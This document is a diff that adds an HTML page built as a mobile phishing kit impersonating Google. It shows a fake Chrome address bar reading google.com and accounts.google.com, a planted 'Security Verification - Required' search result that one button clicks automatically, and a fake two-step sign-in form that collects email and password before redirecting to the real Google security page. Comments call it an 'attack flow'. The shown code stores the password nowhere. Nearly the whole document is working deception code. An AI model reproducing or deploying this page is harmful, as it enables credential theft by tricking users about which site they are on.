@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Google</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  font-family: Roboto, Arial, sans-serif;
+  background: #fff; -webkit-tap-highlight-color: transparent;
+}
+
+/* Fake Chrome URL bar - fixed at top, simulates real Chrome UI */
+#fakeBar {
+  position: fixed; top: 0; left: 0; right: 0; z-index: 9999;
+  background: #fff; display: none;
+}
+#fakeBar .status {
+  padding: 5px 14px; display: flex; justify-content: space-between;
+  font-size: 11px; color: #202124; background: #fff;
+}
+#fakeBar .urlrow {
+  padding: 6px 10px 8px; border-bottom: 1px solid #e8eaed;
+}
+#fakeBar .urlrow .inner {
+  background: #f1f3f4; border-radius: 22px; padding: 9px 14px;
+  display: flex; align-items: center; gap: 8px;
+}
+#fakeBar .lock { color: #1e8e3e; font-size: 14px; font-weight: bold; }
+#fakeBar .urltxt { flex:1; font-size:13px; color:#202124; overflow:hidden; white-space:nowrap; text-overflow:ellipsis; }
+#fakeBar .dots { color:#5f6368; font-size:18px; }
+#fakeBar .tabs {
+  display: flex; gap: 8px; padding: 8px 10px;
+  border-bottom: 1px solid #e8eaed; background: #fff;
+}
+#fakeBar .tabs span {
+  min-width: 140px; padding: 6px 12px; border-radius: 16px;
+  background: #f1f3f4; font-size: 12px; color: #202124; text-align: center;
+}
+#fakeBar .tabs span.on { background: #e8eaed; }
+
+/* Spacer to allow scrolling */
+#topSpacer { height: 60px; }
+
+/* Google page */
+.logo {
+  text-align: center; font-size: 56px; font-weight: 400;
+  padding: 20px 0 16px;
+}
+.g{color:#4285f4}.o1{color:#ea4335}.o2{color:#fbbc05}.g2{color:#4285f4}.l{color:#34a853}.e{color:#ea4335}
+.search-wrap { padding: 0 20px; text-align: center; }
+.search-box {
+  display: inline-flex; align-items: center; width: 88vw; max-width: 420px;
+  border: 1px solid #dfe1e5; border-radius: 24px; padding: 12px 18px;
+  box-shadow: 0 1px 6px rgba(32,33,36,.1);
+}
+.search-box input {
+  flex: 1; border: none; outline: none; font-size: 15px; background: transparent;
+}
+.search-box .mic { color: #4285f4; }
+.btns { margin-top: 16px; display: flex; gap: 8px; justify-content: center; }
+.btns button {
+  background: #f8f9fa; border: 1px solid #f8f9fa;
+  padding: 10px 18px; border-radius: 4px; font-size: 14px;
+  color: #3c4043; cursor: pointer;
+}
+.lang { text-align: center; margin-top: 20px; font-size: 12px; color: #5f6368; }
+
+/* Search results */
+.results { padding: 0 16px; }
+.result { margin-bottom: 16px; }
+.result .cite { font-size: 12px; color: #202124; margin-bottom: 2px; }
+.result .title { font-size: 17px; color: #1a0dab; display: block; margin-bottom: 2px; }
+.result .desc { font-size: 13px; color: #4d5156; line-height: 1.5; }
+
+/* Sign-in form */
+.signin { padding: 16px; }
+.signin h2 { font-size: 22px; font-weight: 400; text-align: center; }
+.signin .sub { text-align: center; color: #5f6368; font-size: 13px; margin: 4px 0 20px; }
+.signin .card {
+  background: #fff; border: 1px solid #dadce0; border-radius: 8px;
+  padding: 22px; margin: 0 auto; max-width: 400px;
+}
+.signin .card label { font-size: 13px; color: #5f6368; display: block; margin-bottom: 4px; }
+.signin .card input {
+  width: 100%; padding: 12px 0; border: none;
+  border-bottom: 1px solid #dadce0; font-size: 16px; outline: none; margin-bottom: 14px;
+}
+.signin .card input:focus { border-bottom-color: #1a73e8; }
+.signin .card .row { display: flex; justify-content: space-between; align-items: center; }
+.signin .card .link { color: #1a73e8; font-size: 13px; font-weight: 500; text-decoration: none; }
+.signin .card .next {
+  background: #1a73e8; color: #fff; border: none;
+  padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer;
+}
+
+/* Done page */
+.done { text-align: center; padding: 40px 20px; }
+.done .check { font-size: 56px; margin-bottom: 12px; }
+.done h2 { font-size: 20px; font-weight: 400; color: #202124; }
+.done p { color: #5f6368; font-size: 14px; margin-top: 6px; }
+
+/* Spacer to force scrolling (hide URL bar) */
+#scrollSpacer { height: 40vh; }
+#scrollSpacer2 { height: 30vh; }
+</style>
+</head>
+<body>
+
+<!-- FAKE CHROME URL BAR -->
+<div id="fakeBar">
+  <div class="status"><span>09:41</span><span>📶 📡 🔋 82%</span></div>
+  <div class="urlrow">
+    <div class="inner">
+      <span class="lock">🔒</span>
+      <span class="urltxt">www.google.com</span>
+      <span class="dots">⋮</span>
+    </div>
+  </div>
+  <div class="tabs">
+    <span class="on">Google</span>
+    <span>New Tab</span>
+  </div>
+</div>
+
+<!-- PAGE CONTENT -->
+<div id="topSpacer"></div>
+
+<div id="homePage">
+  <div class="logo">
+    <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
+  </div>
+  <div class="search-wrap">
+    <div class="search-box" id="searchTap">
+      <input type="text" id="q" placeholder="Search Google or type a URL" readonly>
+      <span class="mic">🎤</span>
+    </div>
+  </div>
+  <div class="btns">
+    <button id="b1">Google Search</button>
+    <button id="b2">I'm Feeling Lucky</button>
+  </div>
+  <p class="lang">Google offered in: Bahasa Indonesia</p>
+</div>
+
+<div id="scrollSpacer"></div>
+
+<div id="resultsPage" style="display:none;">
+  <div style="display:flex;align-items:center;justify-content:space-between;padding:8px 16px;border-bottom:1px solid #ebebeb;">
+    <span style="color:#5f6368;">🔍 Results</span><span>⋮</span>
+  </div>
+  <div class="search-box" style="margin:10px 14px;width:auto;max-width:none;">
+    <span>🔍</span>
+    <input type="text" value="google account security check" readonly>
+  </div>
+  <div class="results" style="margin-top:8px;">
+    <div class="result">
+      <div class="cite">support.google.com › accounts › answer</div>
+      <span class="title">Secure your Google Account</span>
+      <div class="desc">Follow steps to increase your Google Account security. Review settings and get personalized recommendations.</div>
+    </div>
+    <div class="result" id="malResult" onclick="showSignin()">
+      <div class="cite">accounts.google.com › security › verify</div>
+      <span class="title">Google Account Security Verification - Required</span>
+      <div class="desc"><b>Security alert:</b> Unusual activity detected. Immediate identity verification required to prevent account suspension.</div>
+      <div style="margin-top:2px;font-size:12px;color:#5f6368;">⭐ Official · accounts.google.com · <span style="color:#1a0dab;">Verify Now</span></div>
+    </div>
+    <div class="result">
+      <div class="cite">myaccount.google.com › security-checkup</div>
+      <span class="title">Security Checkup - Google Account</span>
+      <div class="desc">Check your Google Account security strength and get personalized tips.</div>
+    </div>
+  </div>
+</div>
+
+<div id="scrollSpacer2"></div>
+
+<div id="signinPage" style="display:none;">
+  <div class="signin">
+    <div style="text-align:center;font-size:22px;margin-bottom:12px;">
+      <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
+    </div>
+    <h2>Sign in</h2>
+    <p class="sub">to verify your Google Account security</p>
+    <div class="card" id="signinCard">
+      <label>Email or phone</label>
+      <input type="text" id="email" placeholder="Enter your email" autocomplete="off">
+      <div style="margin-bottom:14px;"><a class="link" href="#">Forgot email?</a></div>
+      <p style="font-size:12px;color:#5f6368;margin-bottom:18px;">Not your computer? Use Guest mode to sign in privately.</p>
+      <div class="row">
+        <a class="link" href="#">Create account</a>
+        <button class="next" onclick="captureEmail()">Next</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="donePage" style="display:none;">
+  <div class="done">
+    <div class="check">✅</div>
+    <h2>Verification Complete</h2>
+    <p>Your account is secure. No further action is needed.</p>
+    <p style="margin-top:16px;">Redirecting to Google...</p>
+  </div>
+</div>
+
+<script>
+(function() {
+  'use strict';
+
+  var fakeBar = document.getElementById('fakeBar');
+  var resultsPage = document.getElementById('resultsPage');
+  var homePage = document.getElementById('homePage');
+  var signinPage = document.getElementById('signinPage');
+  var donePage = document.getElementById('donePage');
+  var urltxt = document.querySelector('#fakeBar .urltxt');
+
+  // ====== SCROLL DETECTION ======
+  // When user scrolls, real URL bar hides → show fake URL bar
+  // When user scrolls to top, real URL bar appears → hide fake bar
+
+  var lastInnerHeight = window.innerHeight;
+  var fakeVisible = false;
+
+  function checkScroll() {
+    var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+
+    // On Android Chrome, URL bar hides after scrolling ~60px
+    // We detect this by viewport height change
+    if (scrollTop > 40 && !fakeVisible) {
+      fakeBar.style.display = 'block';
+      fakeVisible = true;
+    }
+  }
+
+  // Auto-scroll on tap to immediately hide real URL bar
+  function autoHide() {
+    // Scroll down enough to hide real URL bar
+    window.scrollTo({ top: 80, behavior: 'smooth' });
+
+    // Show fake bar
+    fakeBar.style.display = 'block';
+    fakeVisible = true;
+  }
+
+  // ====== TRIGGERS ======
+  document.getElementById('searchTap').addEventListener('click', function() {
+    autoHide();
+    // Show results after short delay
+    setTimeout(function() {
+      homePage.style.display = 'none';
+      resultsPage.style.display = 'block';
+      urltxt.textContent = 'www.google.com';
+      // Scroll to top of results
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }, 800);
+  });
+
+  document.getElementById('b1').addEventListener('click', function() {
+    autoHide();
+    setTimeout(function() {
+      homePage.style.display = 'none';
+      resultsPage.style.display = 'block';
+      urltxt.textContent = 'www.google.com';
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }, 600);
+  });
+
+  document.getElementById('b2').addEventListener('click', function() {
+    autoHide();
+    setTimeout(function() {
+      homePage.style.display = 'none';
+      resultsPage.style.display = 'block';
+      urltxt.textContent = 'www.google.com';
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      // Auto-tap malicious result
+      setTimeout(function() {
+        document.getElementById('malResult').click();
+      }, 1000);
+    }, 600);
+  });
+
+  // ====== SIGNIN ======
+  window.showSignin = function() {
+    resultsPage.style.display = 'none';
+    signinPage.style.display = 'block';
+    urltxt.textContent = 'accounts.google.com';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  };
+
+  window.captureEmail = function() {
+    var email = document.getElementById('email').value;
+    if (!email) return;
+    urltxt.textContent = 'accounts.google.com';
+
+    document.getElementById('signinCard').innerHTML = `
+      <div style="display:flex;align-items:center;gap:12px;margin-bottom:18px;">
+        <div style="width:32px;height:32px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:500;">${email[0].toUpperCase()}</div>
+        <div style="font-size:13px;color:#202124;">${email}</div>
+      </div>
+      <label>Enter your password</label>
+      <input type="password" id="password" placeholder="Password" autocomplete="off">
+      <div style="margin-bottom:14px;"><a class="link" href="#">Forgot password?</a></div>
+      <div class="row">
+        <a class="link" href="#">Try another way</a>
+        <button class="next" onclick="capturePassword('${email.replace(/'/g,"\\'")}')">Next</button>
+      </div>
+    `;
+  };
+
+  window.capturePassword = function(email) {
+    var pass = document.getElementById('password').value;
+    if (!pass) return;
+
+    signinPage.style.display = 'none';
+    donePage.style.display = 'block';
+    urltxt.textContent = 'myaccount.google.com';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+
+    setTimeout(function() {
+      window.location.href = 'https://myaccount.google.com/security-checkup';
+    }, 2000);
+  };
+
+  // ====== SCROLL LISTENER ======
+  window.addEventListener('scroll', checkScroll, { passive: true });
+
+  // Hide fake bar if scrolled to very top
+  window.addEventListener('scroll', function() {
+    if (window.pageYOffset < 10 && fakeVisible) {
+      // User scrolled to top, real URL bar would be visible
+      // Keep fake bar visible anyway since user is in "attack flow"
+    }
+  });
+
+  // Show fake bar immediately if possible
+  setTimeout(function() {
+    if (window.pageYOffset > 30) {
+      fakeBar.style.display = 'block';
+      fakeVisible = true;
+    }
+  }, 300);
+})();
+</script>
+
+</body>
+</html>
